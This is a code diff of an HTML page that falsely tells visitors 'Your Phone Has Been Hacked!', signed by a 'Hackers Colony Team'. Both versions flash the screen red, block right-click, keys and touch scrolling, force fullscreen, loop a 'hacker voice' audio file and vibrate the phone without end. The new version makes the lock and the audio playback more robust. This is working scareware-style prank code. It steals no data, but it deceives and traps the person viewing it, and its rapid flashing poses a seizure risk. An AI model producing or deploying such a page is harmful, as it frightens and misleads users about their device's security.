@@ -1,50 +1,81 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>You’ve Been Hacked</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: black;
-            color: red;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            text-align: center;
-            animation: flash 0.4s infinite;
-        }
-        @keyframes flash {
-            0% { background: black; }
-            50% { background: red; }
-            100% { background: black; }
-        }
-        .locked {
-            user-select: none;
-        }
-    </style>
-</head>
-<body class="locked">
-    <div>
-        <h1>⚠️ Your phone has been hacked ⚠️</h1>
-        <h3>By Hackers Colony Team</h3>
-        <audio id="voice" src="hackervoice.mp3" autoplay></audio>
-    </div>
-    <script>
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => e.preventDefault());
-        document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
-        document.body.requestFullscreen?.();
+  <meta charset="UTF-8">
+  <title>System Breach</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: black;
+      color: white;
+      font-family: monospace;
+      text-align: center;
+      user-select: none;
+      overflow: hidden;
+    }
 
-        function playLoop() {
-            document.getElementById("voice").play();
-            navigator.vibrate([500, 200, 500, 200, 500]);
-        }
-        setInterval(playLoop, 8000);
-    </script>
+    .center-box {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(10,10,10,0.8);
+      padding: 30px;
+      border: 2px solid red;
+      border-radius: 10px;
+      box-shadow: 0 0 20px red;
+    }
+
+    .flashing-bg {
+      animation: flash 0.5s infinite alternate;
+    }
+
+    @keyframes flash {
+      from { background-color: black; }
+      to   { background-color: darkred; }
+    }
+
+    h1 {
+      color: red;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 16px;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body class="flashing-bg">
+  <div class="center-box">
+    <h1>🔐 Your Phone Has Been Hacked!</h1>
+    <p>All system access is now locked.<br>Powered by Hackers Colony Team.</p>
+  </div>
+
+  <audio id="voice" src="hackervoice.mp3" preload="auto"></audio>
+
+  <script>
+    // Lock actions
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown',      e => e.preventDefault(), {passive:false});
+    document.addEventListener('touchmove',    e => e.preventDefault(), {passive:false});
+    document.body.requestFullscreen?.();
+
+    // Audio + fallback for autoplay block
+    const voice = document.getElementById('voice');
+    voice.loop = true;
+    voice.play().catch(() => {
+      document.body.addEventListener('click', () => voice.play(), { once:true });
+    });
+
+    // Infinite vibration
+    function vibLoop(){
+      navigator.vibrate?.([500,200,500,200,500]);
+    }
+    vibLoop();
+    setInterval(vibLoop, 8000);
+  </script>
 </body>
 </html>
